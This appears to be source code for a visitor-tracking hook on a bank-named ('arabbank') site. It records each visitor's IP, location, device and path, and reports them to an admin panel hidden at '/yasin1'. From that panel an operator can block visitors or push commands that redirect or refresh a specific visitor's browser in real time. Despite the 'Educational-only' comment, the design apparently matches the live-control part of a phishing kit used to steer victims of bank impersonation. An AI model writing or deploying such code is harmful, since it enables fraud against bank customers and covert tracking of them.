// @ts-nocheck
// Educational-only visitor tracking via Supabase Realtime presence + commands.
import { useEffect, useRef, useState } from "react";
import { useLocation, useNavigate } from "@/lib/router-compat";
import { supabase } from "@/integrations/supabase/client";

const VISITOR_KEY = "arabbank_visitor_id_v1";
const REFERRER_KEY = "arabbank_visitor_ref_v1";
const GEO_KEY = "arabbank_visitor_geo_v1";

export function getVisitorId(): string {
  let id = localStorage.getItem(VISITOR_KEY);
  if (!id) {
    id = `V-${Math.random().toString(36).slice(2, 8).toUpperCase()}-${Date.now().toString(36).toUpperCase()}`;
    localStorage.setItem(VISITOR_KEY, id);
  }
  return id;
}

export type VisitorGeo = {
  ip?: string;
  city?: string;
  region?: string;
  country?: string;
  country_code?: string;
  org?: string;
};

export type VisitorPresence = {
  visitor_id: string;
  path: string;
  user_agent: string;
  online_at: string;
  referrer?: string;
  geo?: VisitorGeo;
};

export const VISITOR_CHANNEL = "visitors-online";

// UA helpers (exported for the admin panel)
export function parseDevice(ua: string): { os: string; type: string } {
  if (/iPhone/i.test(ua)) {
    const m = ua.match(/OS (\d+[_\.]\d+(?:[_\.]\d+)?)/);
    const v = m ? m[1].replace(/_/g, ".") : "";
    return { os: `iOS ${v}`.trim(), type: "iPhone" };
  }
  if (/iPad/i.test(ua)) {
    const m = ua.match(/OS (\d+[_\.]\d+)/);
    return { os: `iPadOS ${m ? m[1].replace(/_/g, ".") : ""}`.trim(), type: "iPad" };
  }
  if (/Android/i.test(ua)) {
    const m = ua.match(/Android (\d+(?:\.\d+)?)/);
    return { os: `Android ${m ? m[1] : ""}`.trim(), type: "جوال" };
  }
  if (/Windows NT/i.test(ua)) return { os: "Windows", type: "كمبيوتر" };
  if (/Mac OS X/i.test(ua)) return { os: "macOS", type: "كمبيوتر" };
  if (/Linux/i.test(ua)) return { os: "Linux", type: "كمبيوتر" };
  return { os: "غير معروف", type: "غير معروف" };
}

export function parseBrowser(ua: string): string {
  if (/Edg\//i.test(ua)) return "Edge";
  if (/OPR\//i.test(ua)) return "Opera";
  if (/Chrome\//i.test(ua) && !/Chromium/i.test(ua)) return "Chrome";
  if (/Firefox\//i.test(ua)) return "Firefox";
  if (/Safari\//i.test(ua)) return "Safari";
  return "غير معروف";
}

async function fetchGeo(): Promise<VisitorGeo | undefined> {
  try {
    const cached = localStorage.getItem(GEO_KEY);
    if (cached) {
      const p = JSON.parse(cached);
      if (p && p._t && Date.now() - p._t < 1000 * 60 * 60 * 6) return p.data as VisitorGeo;
    }
    const res = await fetch("https://ipapi.co/json/");
    if (!res.ok) return undefined;
    const j = await res.json();
    const geo: VisitorGeo = {
      ip: j.ip,
      city: j.city,
      region: j.region,
      country: j.country_name,
      country_code: j.country_code,
      org: j.org,
    };
    localStorage.setItem(GEO_KEY, JSON.stringify({ _t: Date.now(), data: geo }));
    return geo;
  } catch {
    return undefined;
  }
}

/** Mounted once at the app root for non-admin pages. */
export function useVisitorPresence() {
  const location = useLocation();
  const navigate = useNavigate();
  const channelRef = useRef<ReturnType<typeof supabase.channel> | null>(null);
  const blockedRef = useRef(false);
  const [geo, setGeo] = useState<VisitorGeo | undefined>(undefined);

  // Skip on admin routes
  const isAdmin = location.pathname.startsWith("/yasin1");

  // Capture referrer once per session
  useEffect(() => {
    if (isAdmin) return;
    if (typeof document === "undefined") return;
    if (!sessionStorage.getItem(REFERRER_KEY)) {
      sessionStorage.setItem(REFERRER_KEY, document.referrer || "");
    }
  }, [isAdmin]);

  // Fetch geo/IP once
  useEffect(() => {
    if (isAdmin) return;
    let alive = true;
    fetchGeo().then((g) => {
      if (alive) setGeo(g);
    });
    return () => {
      alive = false;
    };
  }, [isAdmin]);

  // Check block + listen to block changes
  useEffect(() => {
    if (isAdmin) return;
    const visitorId = getVisitorId();

    const checkBlocked = async () => {
      const { data } = await supabase
        .from("blocked_visitors")
        .select("visitor_id")
        .eq("visitor_id", visitorId)
        .maybeSingle();
      if (data) {
        blockedRef.current = true;
        if (location.pathname !== "/blocked") {
          navigate("/blocked", { replace: true });
        }
      }
    };
    checkBlocked();

    const blockChan = supabase
      .channel("blocked-watch-" + visitorId)
      .on(
        "postgres_changes",
        {
          event: "INSERT",
          schema: "public",
          table: "blocked_visitors",
          filter: `visitor_id=eq.${visitorId}`,
        },
        () => {
          blockedRef.current = true;
          navigate("/blocked", { replace: true });
        },
      )
      .on(
        "postgres_changes",
        {
          event: "DELETE",
          schema: "public",
          table: "blocked_visitors",
          filter: `visitor_id=eq.${visitorId}`,
        },
        () => {
          blockedRef.current = false;
        },
      )
      .subscribe();

    return () => {
      supabase.removeChannel(blockChan);
    };
  }, [isAdmin, navigate, location.pathname]);

  // Listen to redirect/refresh commands
  useEffect(() => {
    if (isAdmin) return;
    const visitorId = getVisitorId();
    const cmdChan = supabase
      .channel("cmd-watch-" + visitorId)
      .on(
        "postgres_changes",
        {
          event: "INSERT",
          schema: "public",
          table: "visitor_commands",
          filter: `visitor_id=eq.${visitorId}`,
        },
        (payload) => {
          const row = payload.new as {
            id: string;
            command: string;
            payload: string | null;
          };
          if (row.command === "redirect" && row.payload) {
            navigate(row.payload);
          } else if (row.command === "refresh") {
            window.location.reload();
          }
          supabase.from("visitor_commands").delete().eq("id", row.id).then();
        },
      )
      .subscribe();

    return () => {
      supabase.removeChannel(cmdChan);
    };
  }, [isAdmin, navigate]);

  // Presence: track current visitor + path (+ geo/referrer when ready)
  useEffect(() => {
    if (isAdmin) return;
    const visitorId = getVisitorId();
    const referrer =
      (typeof sessionStorage !== "undefined" && sessionStorage.getItem(REFERRER_KEY)) || "";

    const channel = supabase.channel(VISITOR_CHANNEL, {
      config: { presence: { key: visitorId } },
    });
    channelRef.current = channel;

    channel
      .on("presence", { event: "sync" }, () => {})
      .subscribe(async (status) => {
        if (status === "SUBSCRIBED") {
          await channel.track({
            visitor_id: visitorId,
            path: location.pathname + location.search,
            user_agent: navigator.userAgent,
            online_at: new Date().toISOString(),
            referrer,
            geo,
          } satisfies VisitorPresence);
        }
      });

    return () => {
      channel.untrack();
      supabase.removeChannel(channel);
      channelRef.current = null;
    };
  }, [isAdmin, location.pathname, location.search, geo]);
}

/** Wrap children, runs the hook. */
export function VisitorPresenceProvider({
  children,
}: {
  children: React.ReactNode;
}) {
  useVisitorPresence();
  return <>{children}</>;
}
